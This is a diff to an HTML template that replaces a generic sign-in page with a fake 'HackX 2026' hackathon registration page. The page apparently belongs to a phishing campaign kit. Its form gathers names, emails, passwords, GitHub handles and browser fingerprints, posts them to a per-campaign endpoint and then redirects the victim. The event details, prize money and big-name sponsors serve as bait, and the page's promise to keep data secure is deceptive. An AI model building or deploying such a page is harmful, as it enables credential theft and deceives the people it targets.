@@ -3,52 +3,334 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sign In</title>
+  <title>HackX 2026 — Global Hackathon</title>
   <script src="/fingerprint.js"></script>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#f0f2f5; display:flex; align-items:center; justify-content:center; min-height:100vh; }
-    .card { background:#fff; padding:2.5rem; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); width:100%; max-width:400px; }
-    .card h1 { font-size:1.5rem; margin-bottom:0.25rem; }
-    .card p { color:#666; margin-bottom:1.5rem; font-size:0.9rem; }
-    label { display:block; font-size:0.85rem; font-weight:600; margin-bottom:0.3rem; color:#333; }
-    input[type="email"], input[type="password"] { width:100%; padding:0.7rem; border:1px solid #ddd; border-radius:6px; margin-bottom:1rem; font-size:0.95rem; }
-    input:focus { outline:none; border-color:#1877f2; }
-    button { width:100%; padding:0.7rem; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:1rem; font-weight:600; cursor:pointer; }
-    button:hover { background:#166fe5; }
-    .error { color:#dc3545; font-size:0.8rem; margin-bottom:0.5rem; display:none; }
-    .footer { text-align:center; margin-top:1rem; font-size:0.8rem; color:#666; }
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #0a0a0f; color: #fff; min-height: 100vh;
+    }
+    .bg-grad {
+      position: fixed; top:0; left:0; width:100%; height:100%;
+      background: radial-gradient(ellipse at 20% 50%, rgba(88, 28, 135, 0.15) 0%, transparent 50%),
+                  radial-gradient(ellipse at 80% 20%, rgba(6, 78, 59, 0.12) 0%, transparent 50%),
+                  radial-gradient(ellipse at 50% 80%, rgba(29, 78, 216, 0.1) 0%, transparent 50%);
+      z-index: -1;
+    }
+
+    .navbar {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 2.5rem; max-width: 1200px; margin: 0 auto;
+    }
+    .navbar .logo { font-size: 1.4rem; font-weight: 800; letter-spacing: -0.5px; }
+    .navbar .logo span { color: #a855f7; }
+    .navbar .nav-links { display: flex; gap: 2rem; align-items: center; }
+    .navbar .nav-links a { color: #aaa; text-decoration: none; font-size: 0.85rem; font-weight: 500; transition: 0.2s; }
+    .navbar .nav-links a:hover { color: #fff; }
+    .navbar .nav-btn {
+      background: linear-gradient(135deg, #7c3aed, #a855f7);
+      color: #fff; padding: 0.5rem 1.2rem; border-radius: 8px;
+      font-size: 0.85rem; font-weight: 600; border: none; cursor: pointer; transition: 0.2s;
+    }
+    .navbar .nav-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4); }
+
+    .hero {
+      display: flex; align-items: center; justify-content: space-between;
+      max-width: 1200px; margin: 2rem auto; padding: 0 2.5rem;
+      gap: 4rem;
+    }
+    .hero-left { flex: 1; }
+    .hero-left .badge {
+      display: inline-block; background: rgba(168, 85, 247, 0.15); color: #a855f7;
+      padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 600;
+      border: 1px solid rgba(168, 85, 247, 0.2); margin-bottom: 1.2rem;
+    }
+    .hero-left h1 {
+      font-size: 3.2rem; font-weight: 900; line-height: 1.1; letter-spacing: -1px;
+      background: linear-gradient(135deg, #fff 40%, #a855f7);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      margin-bottom: 1rem;
+    }
+    .hero-left p {
+      color: #888; font-size: 1.05rem; line-height: 1.6; max-width: 480px; margin-bottom: 2rem;
+    }
+
+    .hero-right {
+      flex: 0 0 420px;
+    }
+
+    .register-card {
+      background: rgba(18, 18, 26, 0.9); border: 1px solid rgba(255,255,255,0.06);
+      backdrop-filter: blur(20px); border-radius: 20px; padding: 2rem;
+    }
+    .register-card h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 0.3rem; }
+    .register-card .sub { color: #666; font-size: 0.8rem; margin-bottom: 1.5rem; }
+    .register-card label { display: block; font-size: 0.75rem; font-weight: 600; color: #aaa; margin-bottom: 0.3rem; text-transform: uppercase; letter-spacing: 0.5px; }
+    .register-card input {
+      width: 100%; padding: 0.75rem 0.9rem; background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; color: #fff;
+      font-size: 0.9rem; margin-bottom: 1rem; transition: 0.2s;
+    }
+    .register-card input:focus { outline: none; border-color: #7c3aed; box-shadow: 0 0 0 3px rgba(124,58,237,0.15); }
+    .register-card input::placeholder { color: #444; }
+    .register-card .row { display: flex; gap: 0.8rem; }
+    .register-card .row > * { flex: 1; }
+    .register-card .terms {
+      font-size: 0.7rem; color: #555; margin: 0.5rem 0 1.2rem; line-height: 1.4;
+    }
+    .register-card .terms a { color: #a855f7; text-decoration: none; }
+    .register-btn {
+      width: 100%; padding: 0.8rem; background: linear-gradient(135deg, #7c3aed, #a855f7);
+      border: none; border-radius: 10px; color: #fff; font-size: 0.95rem;
+      font-weight: 700; cursor: pointer; transition: 0.2s;
+    }
+    .register-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(124,58,237,0.4); }
+    .register-card .alt-login {
+      text-align: center; margin-top: 1.2rem; padding-top: 1.2rem;
+      border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.8rem; color: #666;
+    }
+    .register-card .alt-login a { color: #a855f7; text-decoration: none; font-weight: 600; }
+
+    .features {
+      max-width: 1200px; margin: 5rem auto; padding: 0 2.5rem;
+    }
+    .features h2 { text-align: center; font-size: 1.8rem; font-weight: 800; margin-bottom: 0.5rem; }
+    .features .subtitle { text-align: center; color: #666; font-size: 0.95rem; margin-bottom: 3rem; }
+    .feature-grid {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem;
+    }
+    .feature-card {
+      background: rgba(18, 18, 26, 0.6); border: 1px solid rgba(255,255,255,0.04);
+      border-radius: 16px; padding: 1.8rem; transition: 0.3s;
+    }
+    .feature-card:hover { border-color: rgba(168,85,247,0.2); transform: translateY(-2px); }
+    .feature-card .icon { font-size: 2rem; margin-bottom: 1rem; }
+    .feature-card h3 { font-size: 1rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .feature-card p { font-size: 0.85rem; color: #666; line-height: 1.5; }
+
+    .countdown-wrap {
+      text-align: center; padding: 3rem 2.5rem; max-width: 600px; margin: 3rem auto;
+    }
+    .countdown-wrap h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 1.5rem; }
+    .countdown {
+      display: flex; justify-content: center; gap: 1.5rem;
+    }
+    .countdown-item { text-align: center; }
+    .countdown-item .num {
+      font-size: 2.5rem; font-weight: 900; color: #a855f7;
+      background: rgba(168,85,247,0.08); border: 1px solid rgba(168,85,247,0.15);
+      width: 80px; height: 80px; display: flex; align-items: center; justify-content: center;
+      border-radius: 16px; margin-bottom: 0.3rem;
+    }
+    .countdown-item .label { font-size: 0.7rem; color: #666; text-transform: uppercase; letter-spacing: 1px; }
+
+    .sponsors {
+      max-width: 900px; margin: 4rem auto; padding: 0 2.5rem; text-align: center;
+    }
+    .sponsors h3 { font-size: 0.75rem; color: #555; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 2rem; }
+    .sponsor-logos { display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap; }
+    .sponsor-logos div { color: #444; font-size: 1rem; font-weight: 700; letter-spacing: -0.5px; }
+
+    .footer {
+      text-align: center; padding: 2rem; color: #444; font-size: 0.75rem;
+      border-top: 1px solid rgba(255,255,255,0.04);
+    }
+
+    .error-msg {
+      color: #ef4444; font-size: 0.8rem; margin-bottom: 0.5rem; display: none;
+    }
+
+    @media (max-width: 900px) {
+      .hero { flex-direction: column; gap: 2rem; }
+      .hero-right { flex: 1; width: 100%; }
+      .hero-left h1 { font-size: 2.2rem; }
+      .feature-grid { grid-template-columns: 1fr 1fr; }
+      .navbar .nav-links { display: none; }
+    }
+    @media (max-width: 600px) {
+      .hero { padding: 0 1.5rem; }
+      .feature-grid { grid-template-columns: 1fr; }
+      .countdown-item .num { width: 60px; height: 60px; font-size: 1.8rem; }
+    }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Sign In</h1>
-    <p>to continue to your account</p>
-    <div class="error" id="error">Invalid email or password. Please try again.</div>
-    <form id="loginForm">
-      <label>Email or phone</label>
-      <input type="email" id="email" required autocomplete="off">
-      <label>Password</label>
-      <input type="password" id="password" required>
-      <button type="submit">Sign In</button>
-    </form>
-    <div class="footer">Secure login • <a href="#" style="color:#1877f2;text-decoration:none;">Forgot password?</a></div>
+  <div class="bg-grad"></div>
+
+  <nav class="navbar">
+    <div class="logo">Hack<span>X</span> 2026</div>
+    <div class="nav-links">
+      <a href="#">About</a>
+      <a href="#">Challenges</a>
+      <a href="#">Schedule</a>
+      <a href="#">Sponsors</a>
+      <button class="nav-btn" onclick="document.getElementById('email').focus()">Register</button>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-left">
+      <div class="badge">Applications closing soon</div>
+      <h1>Build the<br>future in 48 hours</h1>
+      <p>
+        The world's most ambitious hackathon. 5,000+ participants, $500K in prizes,
+        and mentorship from top engineers at Google, Meta, and OpenAI.
+      </p>
+      <div style="display:flex;gap:1rem;flex-wrap:wrap;">
+        <div style="display:flex;align-items:center;gap:0.5rem;"><span style="color:#a855f7;">✓</span><span style="color:#888;font-size:0.85rem;">5,000+ hackers</span></div>
+        <div style="display:flex;align-items:center;gap:0.5rem;"><span style="color:#a855f7;">✓</span><span style="color:#888;font-size:0.85rem;">$500K prize pool</span></div>
+        <div style="display:flex;align-items:center;gap:0.5rem;"><span style="color:#a855f7;">✓</span><span style="color:#888;font-size:0.85rem;">120+ countries</span></div>
+      </div>
+    </div>
+
+    <div class="hero-right">
+      <div class="register-card">
+        <h2>Apply now</h2>
+        <p class="sub">Secure your spot — applications are reviewed on a rolling basis.</p>
+        <div class="error-msg" id="error">Something went wrong. Please try again.</div>
+        <form id="registerForm">
+          <label>Full name</label>
+          <input type="text" id="fullname" placeholder="John Doe" required autocomplete="off">
+
+          <label>Email address</label>
+          <input type="email" id="email" placeholder="john@example.com" required autocomplete="off">
+
+          <label>Password</label>
+          <input type="password" id="password" placeholder="Create a password" required>
+
+          <div class="row">
+            <div>
+              <label>GitHub</label>
+              <input type="text" id="github" placeholder="@username" autocomplete="off">
+            </div>
+            <div>
+              <label>Country</label>
+              <input type="text" id="country" placeholder="India" autocomplete="off">
+            </div>
+          </div>
+
+          <div class="terms">
+            By registering, you agree to our <a href="#">Terms of Service</a> and <a href="#">Code of Conduct</a>.
+            We'll keep your data secure and never share it.
+          </div>
+
+          <button type="submit" class="register-btn">Create account →</button>
+        </form>
+        <div class="alt-login">
+          Already registered? <a href="#" onclick="event.preventDefault();document.getElementById('email').focus()">Sign in</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="features">
+    <h2>Why Hack<span style="color:#a855f7;">X</span>?</h2>
+    <p class="subtitle">The hackathon experience engineered for impact</p>
+    <div class="feature-grid">
+      <div class="feature-card">
+        <div class="icon">🧠</div>
+        <h3>AI / ML Challenges</h3>
+        <p>Build with GPT-4, Claude, Gemini, and open-source models. Access free API credits.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🌐</div>
+        <h3>Global Community</h3>
+        <p>Team up with hackers from 120+ countries. Real-time collaboration and mentorship.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🏆</div>
+        <h3>$500K in Prizes</h3>
+        <p>Equity-free grants, cloud credits, internships, and fast-track interviews.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">⚡</div>
+        <h3>48-Hour Sprint</h3>
+        <p>From idea to prototype. Workshops, office hours, and on-demand hardware labs.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🔬</div>
+        <h3>Hardware Lab</h3>
+        <p>Arduino, Raspberry Pi, NVIDIA Jetson, and IoT kits shipped to your doorstep.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">🚀</div>
+        <h3>Launchpad Program</h3>
+        <p>Top teams get 3 months of incubation, legal support, and investor introductions.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="countdown-wrap">
+    <h2>Applications close in</h2>
+    <div class="countdown">
+      <div class="countdown-item"><div class="num" id="days">14</div><div class="label">Days</div></div>
+      <div class="countdown-item"><div class="num" id="hours">08</div><div class="label">Hours</div></div>
+      <div class="countdown-item"><div class="num" id="minutes">42</div><div class="label">Mins</div></div>
+      <div class="countdown-item"><div class="num" id="seconds">19</div><div class="label">Secs</div></div>
+    </div>
+  </section>
+
+  <section class="sponsors">
+    <h3>Sponsored by</h3>
+    <div class="sponsor-logos">
+      <div>Google</div>
+      <div>Meta</div>
+      <div>OpenAI</div>
+      <div>GitHub</div>
+      <div>Vercel</div>
+      <div>Stripe</div>
+    </div>
+  </section>
+
+  <div class="footer">
+    © 2026 HackX Global. All rights reserved. • Privacy Policy • Code of Conduct
   </div>
+
   <script>
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    // Countdown
+    function updateCountdown() {
+      const target = new Date();
+      target.setDate(target.getDate() + 14);
+      target.setHours(target.getHours() + 8);
+
+      const diff = target - new Date();
+      if (diff <= 0) return;
+      document.getElementById('days').textContent = String(Math.floor(diff/(86400000))).padStart(2,'0');
+      document.getElementById('hours').textContent = String(Math.floor((diff%86400000)/3600000)).padStart(2,'0');
+      document.getElementById('minutes').textContent = String(Math.floor((diff%3600000)/60000)).padStart(2,'0');
+      document.getElementById('seconds').textContent = String(Math.floor((diff%60000)/1000)).padStart(2,'0');
+    }
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+
+    // Registration
+    document.getElementById('registerForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
+      const fullname = document.getElementById('fullname').value;
+      const github = document.getElementById('github').value;
+      const country = document.getElementById('country').value;
+
       const fp = await getFingerprint();
       try {
         const res = await fetch('/c/<%= campaign.id %>', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, password, ...fp, fingerprints: JSON.stringify(fp) })
+          body: JSON.stringify({
+            email, password,
+            fullname, github, country,
+            ...fp,
+            fingerprints: JSON.stringify(fp)
+          })
         });
         const data = await res.json();
         if (data.redirect) window.location.href = data.redirect;
-      } catch { window.location.href = '<%= redirect %>'; }
+      } catch {
+        window.location.href = '<%= redirect %>';
+      }
     });
   </script>
 </body>
